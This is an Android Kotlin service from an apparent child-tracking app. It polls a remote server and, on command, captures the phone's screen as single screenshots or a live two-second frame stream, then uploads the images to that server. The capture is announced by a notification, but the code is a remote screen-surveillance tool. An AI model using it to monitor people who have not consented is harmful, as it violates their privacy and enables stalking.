package com.kidtracker

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class ScreenshotService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val handler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()
    private var polling = false
    private var trackingCode = ""
    private var deviceId = ""
    private var isLiveMode = false
    private var liveCaptureRunnable: Runnable? = null

    companion object {
        private const val CHANNEL_ID = "ScreenshotChannel"
        private const val NOTIFICATION_ID = 2
        private const val TAG = "ScreenshotService"
        private var API_BASE: String = "https://tsp.omaromartest12.workers.dev"
        var projectionData: Intent? = null
        var resultCode: Int = Activity.RESULT_CANCELED
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        trackingCode = intent?.getStringExtra("tracking_code") ?: ""
        deviceId = intent?.getStringExtra("device_id") ?: "default"

        if (trackingCode.isEmpty()) {
            stopSelf()
            return START_NOT_STICKY
        }

        val notification = createNotification("Screenshot monitoring active")
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startPolling()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Screenshot Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitors for screenshot and live screen requests"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("TSP Screenshot")
            .setContentText(statusText)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, createNotification(statusText))
    }

    private fun startPolling() {
        polling = true
        val pollRunnable = object : Runnable {
            override fun run() {
                if (!polling) return
                checkForRequest()
                handler.postDelayed(this, 2000)
            }
        }
        handler.post(pollRunnable)
    }

    private fun checkForRequest() {
        if (executor.isShutdown) return
        executor.execute {
            try {
                val url = URL("$API_BASE/api/check-screenshot?code=$trackingCode&device_id=$deviceId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                val response = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(response)
                if (json.optBoolean("pending", false)) {
                    val requestId = json.getString("id")
                    handler.post { handleRequest(requestId) }
                }
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to check request", e)
            }
        }
    }

    private fun handleRequest(requestId: String) {
        if (executor.isShutdown) return
        executor.execute {
            try {
                val url = URL("$API_BASE/api/check-screenshot?id=$requestId")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                val response = conn.inputStream.bufferedReader().readText()
                val json = JSONObject(response)
                val reqType = json.optString("request_type", "screenshot")
                conn.disconnect()

                if (reqType == "live") {
                    handler.post { startLiveMode(requestId) }
                } else {
                    handler.post { takeSingleScreenshot(requestId) }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get request type", e)
            }
        }
    }

    private fun startLiveMode(requestId: String) {
        isLiveMode = true
        updateNotification("Live screen active")
        captureLoop()
    }

    private fun captureLoop() {
        if (!isLiveMode || executor.isShutdown) return
        takeAndUploadFrame(isLive = true)
        liveCaptureRunnable = Runnable { captureLoop() }
        handler.postDelayed(liveCaptureRunnable!!, 2000)
    }

    private fun stopLiveMode() {
        isLiveMode = false
        liveCaptureRunnable?.let { handler.removeCallbacks(it) }
        liveCaptureRunnable = null
        updateNotification("Screenshot monitoring active")
    }

    private fun takeSingleScreenshot(requestId: String) {
        takeAndUploadFrame(isLive = false, requestId = requestId)
    }

    private fun takeAndUploadFrame(isLive: Boolean, requestId: String? = null) {
        val projection = projectionData
        if (projection == null) {
            Log.w(TAG, "No MediaProjection available")
            return
        }

        try {
            val mgr = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            mgr.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels / 2
            val height = metrics.heightPixels / 2
            val density = metrics.densityDpi

            imageReader?.close()
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection?.stop()
            mediaProjection = mpm.getMediaProjection(resultCode, projection)

            virtualDisplay?.release()
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null, handler
            )

            handler.postDelayed({
                try {
                    val image: Image? = imageReader?.acquireLatestImage()
                    if (image != null) {
                        val plane = image.planes[0]
                        val buffer = plane.buffer
                        val pixelStride = plane.pixelStride
                        val rowStride = plane.rowStride
                        val rowPadding = rowStride - pixelStride * width
                        val bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        image.close()

                        val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                        bitmap.recycle()

                        val stream = ByteArrayOutputStream()
                        cropped.compress(Bitmap.CompressFormat.JPEG, 50, stream)
                        cropped.recycle()
                        val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                        val dataUrl = "data:image/jpeg;base64,$base64"

                        if (isLive) {
                            uploadLiveFrame(dataUrl)
                        } else if (requestId != null) {
                            uploadScreenshot(requestId, dataUrl)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to capture", e)
                }
                cleanupCapture()
            }, 300)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to take screenshot", e)
            cleanupCapture()
        }
    }

    private fun uploadScreenshot(requestId: String, screenshot: String) {
        executor.execute {
            try {
                val url = URL("$API_BASE/api/upload-screenshot")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.doOutput = true
                val json = JSONObject().apply {
                    put("id", requestId)
                    put("code", trackingCode)
                    put("device_id", deviceId)
                    put("screenshot", screenshot)
                }
                conn.outputStream.write(json.toString().toByteArray())
                Log.d(TAG, "Screenshot uploaded (HTTP ${conn.responseCode})")
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload screenshot", e)
            }
        }
    }

    private fun uploadLiveFrame(frame: String) {
        executor.execute {
            try {
                val url = URL("$API_BASE/api/upload-live-frame")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 10000
                conn.doOutput = true
                val json = JSONObject().apply {
                    put("code", trackingCode)
                    put("device_id", deviceId)
                    put("frame", frame)
                }
                conn.outputStream.write(json.toString().toByteArray())
                Log.d(TAG, "Live frame uploaded (HTTP ${conn.responseCode})")
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload live frame", e)
            }
        }
    }

    private fun cleanupCapture() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
    }

    override fun onDestroy() {
        polling = false
        isLiveMode = false
        liveCaptureRunnable?.let { handler.removeCallbacks(it) }
        handler.removeCallbacksAndMessages(null)
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { mediaProjection?.stop() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        executor.shutdownNow()
        super.onDestroy()
    }
}
